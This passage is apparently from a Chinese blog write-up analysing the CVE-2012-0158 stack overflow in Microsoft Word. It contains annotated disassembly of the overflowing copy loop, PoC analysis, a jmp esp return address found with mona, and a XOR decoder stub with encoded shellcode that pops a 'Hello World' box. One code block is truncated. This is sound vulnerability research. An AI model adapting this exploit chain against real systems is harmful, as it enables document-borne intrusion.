      mov     ecx, [ebx]</span><br><span class="line">.text:275C87B1                 push    esi</span><br><span class="line">.text:275C87B2                 push    edi</span><br><span class="line">.text:275C87B3                 push    eax</span><br><span class="line">.text:275C87B4                 push    ebx</span><br><span class="line">.text:275C87B5                 call    dword ptr [ecx+0Ch]</span><br><span class="line">.text:275C87B8                 mov     esi, eax</span><br><span class="line">.text:275C87BA                 test    esi, esi</span><br><span class="line">.text:275C87BC                 jl      short loc_275C87EF</span><br><span class="line">.text:275C87BE                 mov     esi, [ebp+lpMem]</span><br><span class="line">.text:275C87C1                 mov     ecx, edi</span><br><span class="line">.text:275C87C3                 mov     edi, [ebp+arg_0];栈地址，只有0x8字节剩余</span><br><span class="line">.text:275C87C6                 mov     eax, ecx</span><br><span class="line">.text:275C87C8                 shr     ecx, 2</span><br><span class="line">.text:275C87CB                 rep movsd               ; 此处就是断点位置</span><br><span class="line">.text:275C87CB                                         ; 分析发现就是此处循环复制数据到栈上使得栈溢出</span><br><span class="line">.text:275C87CD                 mov     ecx, eax</span><br><span class="line">.text:275C87CF                 mov     eax, [ebp+dwBytes]</span><br><span class="line">.text:275C87D2                 and     ecx, 3</span><br><span class="line">.text:275C87D5                 push    0</span><br><span class="line">.text:275C87D7                 lea     edx, [eax+3]</span><br><span class="line">.text:275C87DA                 and     edx, 0FFFFFFFCh</span><br><span class="line">.text:275C87DD                 sub     edx, eax</span><br><span class="line">.text:275C87DF                 rep movsb</span><br><span class="line">.text:275C87E1                 mov     ecx, [ebx]</span><br><span class="line">.text:275C87E3                 push    edx</span><br><span class="line">.text:275C87E4                 push    offset unk_27632368</span><br><span class="line">.text:275C87E9                 push    ebx</span><br><span class="line">.text:275C87EA                 call    dword ptr [ecx+0Ch]</span><br><span class="line">.text:275C87ED                 mov     esi, eax</span><br><span class="line">.text:275C87EF</span><br><span class="line">.text:275C87EF loc_275C87EF:                           ; CODE XREF: sub_275C876D+4Fj</span><br><span class="line">.text:275C87EF                 push    [ebp+lpMem]     ; lpMem</span><br><span class="line">.text:275C87F2                 push    0               ; dwFlags</span><br><span class="line">.text:275C87F4                 push    hHeap           ; hHeap</span><br><span class="line">.text:275C87FA                 call    ds:HeapFree</span><br><span class="line">.text:275C8800                 mov     eax, esi</span><br><span class="line">.text:275C8802</span><br><span class="line">.text:275C8802 loc_275C8802:                           ; CODE XREF: sub_275C876D+1Bj</span><br><span class="line">.text:275C8802                                         ; sub_275C876D+B82Bj ...</span><br><span class="line">.text:275C8802                 pop     edi</span><br><span class="line">.text:275C8803                 pop     esi</span><br><span class="line">.text:275C8804                 pop     ebx</span><br><span class="line">.text:275C8805                 leave</span><br><span class="line">.text:275C8806                 retn</span><br><span class="line">.text:275C8806 sub_275C876D    endp</span><br></pre></td></tr></table></figure>

<ol start="5">
<li><p><strong>总结</strong>：</p>
<p>综上分析，可以发现在函数sub_275C89C7中一共开辟了0x14的局部栈空间，在函数sub_275C876D之前使用了0xC的栈空间，所以函数内部供使用的栈空间为0x8字节，而由于在函数sub_275C876D中复制的大小超过了0x8字节，所以导致了栈溢出漏洞。这里还有个有趣的是读取的长度也可以通过doc文件中构建，所以修改长度和内容就可以肆意的溢出了</p>
</li>
</ol>
<h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h1><h2 id="PoC分析"><a href="#PoC分析" class="headerlink" title="PoC分析"></a>PoC分析</h2><ul>
<li>用010打开PoC，分析是doc文件中那一部分字段进行了溢出，可以搜索0x41414141找到溢出点，进行分析：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/win%E6%BC%8F%E6%B4%9E/cve-2012-01581581931553703.png"></p>
<ul>
<li>之后完成一个简单的利用，弹出窗口<ul>
<li>首先在OD中找到MessageBoxA的地址0x7611EA71，然后修改溢出点代码，弹出窗口</li>
</ul>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/win%E6%BC%8F%E6%B4%9E/cve-2012-01581581933221356.png"></p>
<h2 id="漏洞高级利用"><a href="#漏洞高级利用" class="headerlink" title="漏洞高级利用"></a>漏洞高级利用</h2><ul>
<li>使用windbg+mona+pykd.pyd的组合，利用GetPc技术，构造ShellCode弹出Hello World<ul>
<li>打开windbg附加word后，使用命令<code>.load pykd.pyd</code>和<code>!py mona</code>开启mona，之后使用<code>!py mona find -s &quot;\xff\xe4&quot; -m msvbvm60.dll”</code>找到一个Rebase、SageSEH、ASLR.NXCompat为False，而OS DLL为True的系统模块，获取到的jmp esp地址0x729A0535</li>
</ul>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/win%E6%BC%8F%E6%B4%9E/cve-2012-01581581944622332.png"></p>
<ul>
<li>之后构造一段加密的ShellCode，构造好的ShellCode分为两部分，最开始为解密代码，之后为HelloWord窗口弹出ShellCode：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//解密代码可以使用如下的代码</span></span><br><span class="line">__asm &#123;</span><br><span class="line">		<span class="string">&quot;\x33\xC0&quot;</span> \             <span class="comment">// xor eax,eax</span></span><br><span class="line">		<span class="string">&quot;\xE8\xFF\xFF\xFF\xFF&quot;</span> \ <span class="comment">// call 0xFFFFFFFF</span></span><br><span class="line">		<span class="string">&quot;\xC3&quot;</span> \                 <span class="comment">// retn</span></span><br><span class="line">		<span class="string">&quot;\x58&quot;</span> \                 <span class="comment">// pop eax            ;eax=GetPc</span></span><br><span class="line">		<span class="string">&quot;\x8D\x70\x1B&quot;</span> \         <span class="comment">// lea esi,[eax+0x17] ;esi=Shellcode</span></span><br><span class="line">		<span class="string">&quot;\x33\xC9&quot;</span> \             <span class="comment">// xor ecx,ecx        ;ecx=循环计数器</span></span><br><span class="line">		<span class="string">&quot;\x66\xB9\x95\x01&quot;</span> \     <span class="comment">// mov cx,0x0195      ;cx =She..体积</span></span><br><span class="line">								 <span class="comment">//tag_Decode:</span></span><br><span class="line">		<span class="string">&quot;\x8A\x04\x0E&quot;</span> \         <span class="comment">// mov al,[esi+ecx]   ;al =解密前字节</span></span><br><span class="line">		<span class="string">&quot;\x34\x13&quot;</span> \             <span class="comment">// xor al,0x13        ;0x05为Key</span></span><br><span class="line">		<span class="string">&quot;\x88\x04\x0E&quot;</span> \         <span class="comment">// mov [esi+ecx],al</span></span><br><span class="line">		<span class="string">&quot;\xE2\xF6&quot;</span> \             <span class="comment">// loop tag_Decode</span></span><br><span class="line">		<span class="string">&quot;\x80\x34\x0E\x13&quot;</span> \     <span class="comment">// xor [esi+ecx],0x13 ;解密最后一字节</span></span><br><span class="line">		<span class="string">&quot;\xFF\xE6&quot;</span> \             <span class="comment">// jmp esi            ;跳到Shellcode</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//加密后的shellcode为</span></span><br><span class="line"><span class="comment">/* Encode Key=0x13 */</span></span><br><span class="line"><span class="keyword">char</span> bShellcode[] = \</span><br><span class="line"><span class="string">&quot;\x73\x90\xFF\x43\xF8\x49\x56\x6B\x7A\x67\x43\x61\x7C\x70\x76\x60&quot;</span> \</span><br><span class="line"><span class="string">&quot;\x60\x13\x5B\x76\x7F\x7F\x7C\x33\x44\x7C\x61\x7F\x77\x32\x13\x56&quot;</span> \</span><br><span class="line"><span class="string">&quot;\x6B\x7A\x67\x43\x61\x7C\x70\x76\x60\x60\x13\x5E\x76\x60\x60\x72&quot;</span> \</span><br><span class="line"><span class="string">&quot;\x74\x76\x51\x7C\x6B\x52\x13\x46\x60\x76\x61\x20\x21\x3D\x77\x7F&quot;</span> \</span><br><span class="line"><span class="string">&quot;\x7F\x13\x5F\x7C\x72\x77\x5F\x7A\x71\x61\x72\x61\x6A\x56\x6B\x52&quot;</span> \</span><br><span class="line"><span class="string">&quot;\x13\x54\x76\x67\x43\x61\x7C\x70\x52\x77\x77\x61\x76\x60\x60\x13&quot;</span> \</span><br><span class="line"><span class="string">&quot;\xFB\x13\x13\x13\x13\x48\x77\x98\x26\x23\x13\x13\x13\x98\x65\x1F&quot;</span> \</span><br><span class="line"><span class="string">&quot;\x98\x65\x0F\x98\x25\x98\x45\x1B\x41\x40\x40\x41\xFB\x7C\x13\x13&quot;</span> \</span><br><span class="line"><span class="string">&quot;\x13\x48\x49\x41\x43\x9E\x58\xCE\x42\x41\xEC\xC3\x4A\x49\x41\x40&quot;</span> \</span><br><span class="line"><span class="string">&quot;\x43\x42\xFB\x13\x13\x13\x13\x46\x98\xFF\x90\xFF\x1F\x98\x4E\x03&quot;</span> \</span><br><span class="line"><span class="string">&quot;\x9E\x58\xC1\x79\x13\x79\x13\x42\xEC\x46\x1F\x9E\x46\xEF\x9A\x11&quot;</span> \</span><br><span class="line"><span class="string">&quot;\x98\x4E\x03\x9E\x58\xD5\x42\xEC\x66\xEF\xEC\x46\x1B\x9E\x46\xEB&quot;</span> \</span><br><span class="line"><span class="string">&quot;\x9A\x11\x98\x4E\x03\x9E\x58\xB2\x42\xEC\x66\x07\x98\x56\x1B\xEC&quot;</span> \</span><br><span class="line"><span class="string">&quot;\xC3\x9E\x46\xE7\x9A\x11\x98\x4E\x03\x9E\x58\xBE\x79\x13\x42\x42&quot;</span> \</span><br><span class="line"><span class="string">&quot;\x79\x13\xEC\x46\xEB\x79\x13\xEC\x46\xE7\x98\xF6\x4E\xD1\x03\x13&quot;</span> \</span><br><span class="line"><span class="string">&quot;\x46\x98\xFF\x90\xFF\x1F\x98\x46\x1B\x98\x61\x2F\x10\xE1\x98\x65&quot;</span> \</span><br><span class="line"><span class="string">&quot;\x6B\x10\xE1\x98\x6D\x0F\x10\xE9\x9A\x6E\xEF\x98\x6D\x33\x10\xE9&quot;</span> \</span><br><span class="line"><span class="string">&quot;\x9A\x6E\xEB\x98\x6D\x37\x10\xE9\x9A\x6E\xE7\x20\xDA\x42\x98\x56&quot;</span> \</span><br><span class="line"><span class="string">&quot;\xEB\x98\x17\x9B\x10\x56\x1B\x43\x98\x4E\x1F\x90\xF8\x07\x40\xFB&quot;</span> \</span><br><span class="line"><span class="string">&quot;\x33\x13\x13\x13\x4A\x96\xD3\x66\x10\x52\xF8\xF2\x98\x56\xE7\x20&quot;</span> \</span><br><span class="line"><span class="string">&quot;\xEC\x75\x98\x2F\x5B\x98\x46\xEF\x98\x17\xA9\x10\x56\x1B\x98\xF6&quot;</span> \</span><br><span class="line"><span class="string">&quot;\x4E\xD1\x1B\x13\x46\x98\xFF\x20\xD3\xAA\xEC\xEC\xEC\xEC\x98\x6E&quot;</span> \</span><br><span class="line"><span class="string">&quot;\x1B\xE1\xBD\xE4\xC2\x98\xCA\x20\xD3\xAA\xEC\xEC\xEC\xEC\x98\x6E&quot;</span> \</span><br><span class="line"><span class="string">&quot;\x1F\xE1\xBD\xE4\xC2\x28\xD8\x66\x01\x98\x66\x1F\x98\x6E\x1B\xEF&quot;</span> \</span><br><span class="line"><span class="string">&quot;\xE0\xB5\x66\x14\xAB\x12\x13\x13\x13\xF8\x11\x20\xD3\x98\xF6\x4E&quot;</span> \</span><br><span class="line"><span class="string">&quot;\xD1\x1B\x13\x13&quot;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>将上述ShellCode转换为如下文本形式，然后对PoC中的内容进行填充，填充完毕运行</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">33</spanspan><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/win%E6%BC%8F%E6%B4%9E/cve-2012-01581581946076252.png"></p>
<ul>
<li>使用OD附加调试，对jmp esp地址0x729A0535下断，加载新的PoC运行：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/win%E6%BC%8F%E6%B4%9E/cve-2012-01581581946955936.png"></p>
<ul>
<li>然后继续运行，完美弹出Hello World窗口</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/win%E6%BC%8F%E6%B4%9E/cve-2012-01581581946610491.png"></p>
]]></content>
      <categories>
        <category>漏洞研究</category>
      </categories>
      <tags>
        <tag>win漏洞</tag>
      </tags>
  </entry>
</search>
